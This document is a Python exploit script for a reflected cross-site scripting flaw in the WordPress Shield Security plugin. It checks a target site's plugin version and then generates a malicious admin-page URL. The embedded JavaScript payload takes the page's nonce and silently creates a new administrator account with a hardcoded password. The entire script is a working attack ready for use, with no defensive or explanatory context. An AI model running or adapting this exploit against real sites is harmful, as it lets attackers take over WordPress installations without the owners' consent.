import sys
import urllib.parse
import requests
from bs4 import BeautifulSoup

def format_target_url(target_url):
    if target_url.startswith("http://") or target_url.startswith("https://"):
        return target_url
    else:
        return f"http://{target_url}"

def check_vulnerability(target_url):
    try:
        response = requests.get(f"{target_url}/wp-login.php")
        if response.status_code == 200:
            # Extract the version number from the response
            version_info = response.text.split("ver=")[-1].split("\"")[0]
            version = version_info.split(".")
            major_version = int(version[0])
            minor_version = int(version[1])
            patch_version = int(version[2].split('&')[0])

            # Check if the version is less than 20.0.6
            if major_version < 20 or (major_version == 20 and minor_version == 0 and patch_version < 6):
                print("Shield Security version is vulnerable. Let's continue.")
                return True
            else:
                print("Version not vulnerable.")
                return False
        else:
            print("Failed to retrieve the version information.")
            return False
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

def generate_xss_payload(target_url, username, email, first_name, last_name):
    hardcoded_password = "HaxorStrongAFPassword123!!"
    payload_template = (
        "var xhrNonce = new XMLHttpRequest(); "
        "xhrNonce.open('GET', '/wp-admin/user-new.php', true); "
        "xhrNonce.onload = function() {{ "
        "if (xhrNonce.status === 200) {{ "
        "var nonce = xhrNonce.responseText.match(/name=\"_wpnonce_create-user\" value=\"([a-zA-Z0-9]+)\"/)[1]; "
        "var xhr = new XMLHttpRequest(); "
        "xhr.open('POST', '/wp-admin/user-new.php', true); "
        "xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); "
        "xhr.setRequestHeader('Referer', '{target}/wp-admin/user-new.php'); "
        "xhr.setRequestHeader('Origin', '{target}'); "
        "var params = 'action=createuser&_wpnonce_create-user=' + nonce + "
        "'&_wp_http_referer=%2Fwp-admin%2Fuser-new.php"
        "&user_login={username}&email={email}"
        "&first_name={first_name}&last_name={last_name}&url=test"
        "&pass1={password}&pass2={password}&role=administrator"
        "&wpforo_usergroup=0&wpforo_secondary_groupids%5B%5D=0&wpforo_usertimezone=&createuser=Add+New+User'; "
        "xhr.send(params); "
        "xhr.onload = function() {{ "
        "if (xhr.status == 200) {{ "
        "console.log('Admin user created successfully'); "
        "window.location.href = '{target}/wp-admin/admin.php?page=icwp-wpsf-plugin&nav=dashboard&nav_sub=overview'; "
        "}} else {{ console.log('Error occurred: ' + xhr.statusText); }} "
        "}}; "
        "}} else {{ console.log('Error fetching nonce: ' + xhrNonce.statusText); }} }}; "
        "xhrNonce.send();"
    )

    payload = payload_template.format(
        target=target_url,
        username=username,
        email=urllib.parse.quote(email),
        first_name=first_name,
        last_name=last_name,
        password=urllib.parse.quote(hardcoded_password)
    )

    encoded_payload = urllib.parse.quote(f"<script>{payload}</script>")
    full_url = f"{target_url}/wp-admin/admin.php?page=icwp-wpsf-plugin&nav=dashboard&nav_sub={encoded_payload}"

    return full_url

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <target_url>")
        sys.exit(1)

    raw_target_url = sys.argv[1]
    target_url = format_target_url(raw_target_url)

    # Check if the target is vulnerable
    if not check_vulnerability(target_url):
        sys.exit(1)

    # Prompt for other parameters
    username = input("Enter username: ")
    email = input("Enter email: ")
    first_name = input("Enter first name: ")
    last_name = input("Enter last name: ")
    
    # Display the hardcoded password
    hardcoded_password = "HaxorStrongAFPassword123!!"
    print(f"\nUsing hardcoded password: {hardcoded_password}")

    # Generate the XSS payload URL
    xss_payload_url = generate_xss_payload(target_url, username, email, first_name, last_name)
    print(f"\nGenerated XSS Payload URL: {xss_payload_url}")
